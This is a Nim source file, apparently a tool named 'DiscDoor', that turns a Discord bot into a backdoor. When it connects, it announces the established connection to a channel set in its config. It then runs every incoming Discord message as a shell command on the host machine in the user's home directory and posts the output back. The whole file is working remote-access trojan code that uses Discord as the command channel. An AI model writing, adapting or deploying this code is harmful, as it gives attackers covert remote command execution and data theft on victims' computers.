import dimscord, asyncdispatch, options, times, osproc, strutils, streams, os
include config, text

os.setCurrentDir(getHomeDIr())

let discord = newDiscordClient(TOKEN)

# Funzione da chiamare quando il bot è pronto
proc onReady(s: Shard, r: Ready) {.event(discord).} =
    discard await discord.api.sendMessage(
      CHANNEL,
      "**output**\n" & "> _CONNECTION SUCCESSFULLY ESTABLISHED_" 
    )
    echo yellow & ASCII & resetColor
    echo titleColor & ":: EVENT ::" & resetColor & "\n"
    PrintEvent("Bot started", "Default")

# Gestisci l'evento message_create
proc messageCreate(s: Shard, m: Message) {.event(discord).} =
  if("output" in m.content) or ("DiscDoor" in m.content):
    PrintEvent("OuputPrinted", "Default")
  
  elif("CChelp" == m.content):
    discard await discord.api.sendMessage(
      m.channel_id,
      INFO
    )
  else:
    PrintEvent("CommandExecuted", "Default")
    let (output, _) = execCmdEx(m.content)
    
    if output.len > 2000:
      discard await discord.api.sendMessage(
        m.channel_id,
        "**output**\n```" & "Output too long..." & "```"
      )

    else:
      discard await discord.api.sendMessage(
        m.channel_id,
        "**output**\n```" & output & "```"
      )
    

# Funzione principale per avviare il bot
proc main() {.async.} =
  await discord.startSession()

# Avvia il programma principale
waitFor main()

